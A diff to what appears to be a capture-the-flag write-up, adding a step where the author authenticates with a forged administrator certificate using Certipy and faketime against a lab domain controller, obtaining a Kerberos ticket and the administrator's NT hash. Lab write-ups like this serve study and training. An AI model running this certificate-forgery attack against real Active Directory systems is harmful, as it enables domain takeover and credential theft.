@@ -845,7 +845,24 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 [*] Wrote forged certificate and private key to 'administrator_forged.pfx'
 ```
 
-After downloading the pfx to my system ill forge a
+After downloading the pfx to my system ill forge an administrator cert
+
+```python
+❯❯❯ faketime -f +8h certipy-ad auth -pfx administrator_forged.pfx -dc-ip '10.129.245.51' 
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'Administrator@certificate.htb'
+[*] Using principal: 'administrator@certificate.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
+```
+
+THen 
 
 
 
